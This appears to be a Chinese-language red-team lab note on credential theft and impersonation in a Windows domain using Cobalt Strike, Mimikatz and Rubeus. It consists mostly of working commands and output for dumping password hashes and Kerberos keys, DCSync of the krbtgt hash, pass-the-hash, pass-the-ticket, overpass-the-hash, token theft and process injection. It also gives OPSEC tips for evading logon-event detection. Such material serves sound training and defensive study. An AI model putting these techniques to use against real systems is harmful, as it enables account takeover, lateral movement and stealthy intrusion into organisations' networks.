# Credentials & User Impersonation

1. Credential Theft

net logons将显示当前登录到主机的所有用户

```
beacon> net logons
Logged on users at \\localhost:

DEV\SRV-1$
DEV\jking
DEV\svc_mssql
```

也可以通过ps命令查看登录过本机的用户（开启的进程）
```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           DEV\jking
2496  716   svchost.exe                  x64   1           DEV\jking
2948  1200  sihost.exe                   x64   1           DEV\jking
3088  1200  taskhostw.exe                x64   1           DEV\jking
3320  3304  explorer.exe                 x64   1           DEV\jking
3608  796   ShellExperienceHost.exe      x64   1           DEV\jking
3800  796   SearchUI.exe                 x64   1           DEV\jking
4004  3320  shutdown.exe                 x64   1           DEV\jking
4016  4004  conhost.exe                  x64   1           DEV\jking
4472  1200  taskhostw.exe                x64   1           DEV\jking
[...snip...]
2656  716   sqlservr.exe                 x64   0           DEV\svc_mssql
```

# Beacon + Mimikatz

在CS中用mimikatz提升权限使用```!```和```@```符号

```!```在运行beacon命令之前提升到system权限，如
```
beacon> mimikatz !lsadump::sam
```

```@```impersonates Beacon's thread token before running the command



# LogonPasswords(NTLM Hashes)

导出内存中的密码，有可能出现明文密码，但是可能性比较小。需要本地管理员权限
```
beacon> mimikatz sekurlsa::logonpasswords
```

上面命令在Cobalt Strike里的缩写

```
logonpasswords
```

# eKeys(Kerberos Encryption Keys)

这个 Mimikatz 模块将转储 Kerberos 加密密钥。

这个Mimikatz模块将转储Kerberos加密密钥。由于大多数Windows服务选择使用Kerberos而不是NTLM，利用这些比NTLM的哈希值更有意义，可以混入正常的认证流量。

以下命令需要本地管理员权限

```
beacon> mimikatz sekurlsa::ekeys
```


# Security Account Manager

 (SAM) 数据库仅保存本地帐户的 NTLM 哈希

 下面命令需要本地管理员权限
```
 beacon> mimikatz lsadump::sam
```


# Domain Cached Credentials

域缓存凭据

Domain Cached Credentials 的设计初衷是计算机离线以后还可以继续登录机器，可以离线提取和破解这些凭据以获得明文密码

注意：这里的哈希格式不是ntlm

```
beacon> mimikatz lsadump::cache

Domain : SRV-1
SysKey : 5d11b46a92921b8775ca574306ba5355

Local name : SRV-1 ( S-1-5-21-4124990477-354564332-720757739 )
Domain name : DEV ( S-1-5-21-3263068140-2042698922-2891547269 )
Domain FQDN : dev.cyberbotic.io

Policy subsystem is : 1.14
LSA Key(s) : 1, default {2f242789-b6b3-dc42-0903-3e03acab0bc2}
  [00] {2f242789-b6b3-dc42-0903-3e03acab0bc2} c09ac7dd10900648ef451c40c317f8311a40184b60ca28ae78c9036315bf8983

* Iteration is set to default (10240)

[NL$1 - 2/25/2021 1:07:37 PM]
RID       : 00000460 (1120)
User      : DEV\bfarmer
MsCacheV2 : 98e6eec9c0ce004078a48d4fd03f2419

[NL$2 - 5/17/2021 2:00:46 PM]
RID       : 0000046e (1134)
User      : DEV\svc_mssql
MsCacheV2 : 3f903860f7b6861a702eb9d6509d9da6

[NL$3 - 5/17/2021 2:00:50 PM]
RID       : 00000462 (1122)
User      : DEV\jking
MsCacheV2 : 673e2fe26e26e79c58379168b79890f6
```

可以使用hashcat破解上面的哈希，例子见[这里](https://hashcat.net/wiki/doku.php?id=example_hashes)


# Extracting Kerberos Tickets

从内存中提取TGT


列出内存中的TGT
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe triage

Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0x3e7

 ------------------------------------------------------------------------------------------------------------------ 
 | LUID    | UserName                     | Service                                       | EndTime               |
 ------------------------------------------------------------------------------------------------------------------ 
 | 0x462eb | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:34:03 AM |
 | 0x25ff6 | bfarmer @ DEV.CYBERBOTIC.IO  | krbtgt/DEV.CYBERBOTIC.IO                      | 5/12/2021 12:33:41 AM |
 ------------------------------------------------------------------------------------------------------------------
```

使用 ```/service``` 和 ```/luid```参数限制提取的TGT的数量和类型
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe dump /service:krbtgt /luid:0x462eb /nowrap
```

使用```createnetonly ```命令创建一个登陆会话，并且记下新的LUID
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4872
[+] LUID            : 0x92a8c
```

现在使用ptt，指定LUID，把tiket传递到指定会话中
```
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]

[*] Action: Import Ticket
[*] Target LUID: 0x92a8c
[+] Ticket successfully imported!
```

窃取该进程的访问令牌并访问目标资源

```
beacon> steal_token 4872
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     05/06/2021 09:49:35   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     05/10/2021 09:52:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/29/2021 12:15:45   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     05/06/2021 09:50:19   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     05/11/2021 13:17:32   pagefile.sys
```


# DCSync

前提是有DCSync的能力

执行DCSync，难道krbtgt的哈希
```
beacon> make_token DEV\nlamb F3rrari

beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

Credentials:
  Hash NTLM: 9fb924c244ad44e934c390dc17e02c3d
    ntlm- 0: 9fb924c244ad44e934c390dc17e02c3d
    lm  - 0: 207d5e08551c51892309c0cf652c353b
    
* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e
      aes128_hmac       (4096) : 6fb62ed56c7de778ca5e4fe6da6d3aca
      des_cbc_md5       (4096) : 629189372a372fda
```




# Make Token

Cobalt Strike中的```make_token```命令使用[LogonUserA](https://docs.microsoft.com/en-gb/windows/win32/api/winbase/nf-winbase-logonusera) API，该API接收用户的用户名、域和明文密码以及登录类型。make_token传递LOGON32_LOGON_NEW_CREDENTIALS类型，MS文档中描述为：

>This logon type allows the caller to clone its current token and specify new credentials for outbound connections. The new logon session has the same local identifier but uses different credentials for other network connections.


使用场景：
bfarmer是srv-1计算机的管理员

bfarmer不是srv-2计算机的管理员

bfarmer现在不能登录srv-2计算机

jking是srv-2计算机的管理员

jking曾经在srv-1计算机登录(因此在srv-1中留有登录的token)

此时，bfarmer用户可以使用```make_token```命令（需要jking的明文密码）利用jking的身份克隆token登录B计算机（但是getuid显示还是bfarmer的身份）

```
beacon> make_token DEV\jking Purpl3Drag0n
[+] Impersonated DEV\bfarmer
```

```
beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/04/2021 10:12:52   pagefile.sys
```

# Process Injection

就是msf里的进程迁移

可以迁移当前用户的任意进程

迁移到其他用户的进程需要admin权限

```
beacon> ps

PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
448   796   RuntimeBroker.exe            x64   1           DEV\jking
2496  716   svchost.exe                  x64   1           DEV\jking
2948  1200  sihost.exe                   x64   1           DEV\jking
3088  1200  taskhostw.exe                x64   1           DEV\jking
3320  3304  explorer.exe                 x64   1           DEV\jking
3608  796   ShellExperienceHost.exe      x64   1           DEV\jking
3800  796   SearchUI.exe                 x64   1           DEV\jking
4004  3320  shutdown.exe                 x64   1           DEV\jking
4016  4004  conhost.exe                  x64   1           DEV\jking
4472  1200  taskhostw.exe                x64   1           DEV\jking

beacon> inject 3320 x64 tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```

参数解释
```
3320 is the PID of the target process.

x64 is the architecture of that process.

tcp-4444-local is the name of the listener.
```

不要进行跨架构迁移，例如 x86 -> x64 或 x64 -> x86


# Token Impersonation

```steal_token```命令将模拟目标进程的访问令牌

和make_token一样，它适用于跨网络的资源访问，但不适用于本地操作。

使用```rev2self```来释放模拟的token

```
beacon> ls \\srv-2\c$
[-] could not open \\srv-2\c$\*: 5

beacon> steal_token 3320
[+] Impersonated DEV\jking

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/04/2021 10:12:52   pagefile.sys

beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 20 bytes
```

# SpawnAs


```spawnas```命令将使用用户的明文密码生成一个新进程，并将 Beacon 有效负载注入其中

会在磁盘上创建整个用户配置文件

```
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
[+] established link to child beacon: 10.10.17.231
```

一个常见的错误是，在某个目录下没有写权限
```
beacon> spawnas DEV\jking Purpl3Drag0n tcp-4444-local
[-] could not run C:\Windows\system32\rundll32.exe as DEV\jking: 267
[-] Could not connect to target
```
这种情况换一个有写权限的目录


此命令不需要本地管理员权限，就算是system账号运行，此命令也有可能会失败。

# Pass the Hash

Beacon 有一个专门的```pth```命令，可以在后台执行 Mimikatz

```
beacon> pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e
```

手动执行 Mimikatz
```
beacon> mimikatz sekurlsa::pth /user:jking /domain:dev.cyberbotic.io /ntlm:4ffd3eabdce2e158d923ddec72de979e
```

上面的命令如果没有指定```/run```参数，则会弹出一个cmd.exe的窗口，这有可能会暴露自己，有违红队原则。

使用```/run```或者```powershell -w hidden```来隐藏创建的窗口

一旦pth的进程被创建，再使用steal_token来窃取身份

```
beacon> steal_token 6284
[+] Impersonated NT AUTHORITY\SYSTEM
```

使用```rev2self```和```kill```命令结束上面的进程
```
beacon> rev2self
[*] Tasked beacon to revert token
[+] host called home, sent: 8 bytes

beacon> kill 6284
[*] Tasked beacon to kill 6284
[+] host called home, sent: 12 bytes
```

# Pass the Ticket

ptt是一种允许您将 Kerberos 票证添加到您有权访问的现有登录会话 (LUID) 或您创建的新登录会话的技术（Pass the ticket is a technique that allows you add Kerberos tickets to an existing logon session (LUID) that you have access to, or a new one you create）

首先创建一个新的空会话，该会话没有票据
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe

[*] Action: Create Process (/netonly)

[*] Using random username and password.

[*] Showing process : False
[*] Username        : GJB9A2GP
[*] Domain          : VPY1XQRP
[*] Password        : R4ABN1K3
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 4748
[+] LUID            : 0x798c2c
```


记住上面会话的LUID是：```0x798c2c```

执行ptt，把票据注入到上面的会话
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP

[*] Action: Import Ticket
[*] Target LUID: 0x798c2c
[+] Ticket successfully imported!
```

使用Rubeus triage命令现在可以看到这个LUID
```
 | 0x798c2c | jking @ DEV.CYBERBOTIC.IO    | krbtgt/DEV.CYBERBOTIC.IO                      | 9/1/2022 5:29:20 PM |
```


最后一步，使用```steal_token ```命令窃取上面的进程会话.假如这里是4748
```
beacon> steal_token 4748

beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     08/15/2022 18:50:13   $Recycle.Bin
          dir     08/10/2022 04:55:17   $WinREAgent
          dir     08/10/2022 05:05:53   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     08/15/2022 18:58:09   inetpub
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/24/2022 11:02:25   Program Files
          dir     08/10/2022 04:06:16   Program Files (x86)
          dir     08/31/2022 17:40:32   ProgramData
          dir     08/15/2022 18:31:08   Recovery
          dir     08/30/2022 11:16:24   System Volume Information
          dir     08/30/2022 17:51:08   Users
          dir     08/30/2022 20:19:27   Windows
 427kb    fil     08/10/2022 05:00:07   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     09/01/2022 07:26:41   DumpStack.log.tmp
 384mb    fil     09/01/2022 07:26:41   pagefile.sys

```

**OPSEC**

> 默认情况下，Rubeus 将使用 CreateProcessWithLogonW 的随机用户名、域和密码，这将出现在相关的 4624 登录事件中。“可疑登录事件”保存的搜索将显示 4624，其中TargetOutboundDomainName不是预期值。

我们可以在命令行上提供这些选项，以使字段看起来不那么异常。密码不必是用户的实际密码

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
```


# Overpass the Hash

[Rubeus](https://github.com/GhostPack/Rubeus)允许我们在不需要提升权限的情况下执行 opth

步骤如下：
1. 为我们要模拟的用户创建一个TGT
2. 创建一个登陆会话
3. 将 TGT 传递到该登录会话中
4. 访问目标机器

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /rc4:4ffd3eabdce2e158d923ddec72de979e /nowrap
```


Rubeus 也有一个```/opsec```参数，在没有预授权的情况下发送请求，以更接近地模拟真正的 Kerberos 流量

```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec
```


使用 ```klist``` (or ```execute-assembly Rubeus klist```) 列出所有 Kerberos tickets

```
beacon> run klist
```

使用```make_token```和一个假密码来创建和冒充一个新的登录会话

```
beacon> make_token DEV\jking DummyPass
[+] Impersonated DEV\bfarmer

beacon> run klist

Current LogonId is 0:0x785927

Cached Tickets: (0)
```


在靶机上把jkingTGT.kirbi转成base64
```
PS C:\> [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
```

在kali上根据上面的base64重新生成jkingTGT.kirbi
```
root@kali:~# echo -en "[...ticket...]" | base64 -d > jkingTGT.kirbi
```

使用```kerberos_ticket_use```命令传递TGT

```
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/04/2021 10:12:52   pagefile.sys
```

如果当前shell在特权上下文中，rebuse还可以省略一些利用步骤

```
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jking /domain:dev.cyberbotic.io /aes256:a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1 /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe

[*] Action: Ask TGT
[*] Showing process : False
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 3044
[+] LUID            : 0x85a103

[*] Using domain controller: dc-2.dev.cyberbotic.io (10.10.17.71)
[*] Using aes256_cts_hmac_sha1 hash: a561a175e395758550c9123c748a512b4b5eb1a211cbd12a1b139869f0c94ec1
[*] Building AS-REQ (w/ preauth) for: 'dev.cyberbotic.io\jking'
[*] Target LUID : 8757507
[+] TGT request successful!
[*] base64(ticket.kirbi):

      [...ticket...]

[*] Target LUID: 0x85a103
[+] Ticket successfully imported!

  ServiceName           :  krbtgt/DEV.CYBERBOTIC.IO
  ServiceRealm          :  DEV.CYBERBOTIC.IO
  UserName              :  jking
  UserRealm             :  DEV.CYBERBOTIC.IO
  StartTime             :  3/4/2021 12:48:16 PM
  EndTime               :  3/4/2021 10:48:16 PM
  RenewTill             :  3/11/2021 12:48:16 PM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType               :  aes256_cts_hmac_sha1
  Base64(key)           :  Jr93ezQ6z+rc0/1h30UXaGxVkRLVsWSl9mG0nNeXuTU=

beacon> steal_token 3044
[+] Impersonated NT AUTHORITY\SYSTEM

beacon> ls \\srv-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     12/13/2017 21:00:56   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/23/2021 17:08:43   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     02/17/2021 18:28:36   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     02/17/2021 18:28:54   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     03/04/2021 10:12:52   pagefile.sys
```


